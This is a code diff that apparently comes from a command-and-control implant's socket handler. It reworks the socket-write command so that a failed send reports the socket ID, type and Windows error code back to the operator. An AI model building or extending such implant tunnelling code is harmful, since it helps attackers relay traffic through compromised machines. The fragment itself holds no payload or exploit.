@@ -2796,10 +2796,12 @@ VOID CommandSocket( PPARSER Parser )
             break;
         }
 
-        case SOCKET_COMMAND_READ_WRITE: PUTS( "Socket::Write" )
+        case SOCKET_COMMAND_WRITE: PUTS( "Socket::Write" )
         {
             DWORD  SocketID = 0;
             BUFFER Data     = { 0 };
+            BOOL   Success  = FALSE;
+            DWORD  Type     = SOCKET_TYPE_NONE;
 
             /* Parse arguments */
             SocketID    = ParserGetInt32( Parser );
@@ -2818,10 +2820,13 @@ VOID CommandSocket( PPARSER Parser )
 
                 if ( Socket->ID == SocketID )
                 {
+                    Type = Socket->Type;
+
                     /* write the data to the socket */
                     if ( Instance.Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) != SOCKET_ERROR )
                     {
                         PRINTF( "Sent 0x%x bytes to Socket %x\n", Data.Length, SocketID )
+                        Success = TRUE;
                     }
                     else
                     {
@@ -2834,11 +2839,20 @@ VOID CommandSocket( PPARSER Parser )
                 Socket = Socket->Next;
             }
 
-            /* destroy the package and exit this command function */
-            PackageDestroy( Package );
-            Package = NULL;
-
-            return;
+            if ( ! Success )
+            {
+                PackageAddInt32( Package, SocketID );
+                PackageAddInt32( Package, Type );
+                PackageAddInt32( Package, FALSE );
+                PackageAddInt32( Package, Instance.Win32.WSAGetLastError() );
+            }
+            else
+            {
+                /* destroy the package and exit this command function */
+                PackageDestroy( Package );
+                Package = NULL;
+                return;
+            }
         }
 
         case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
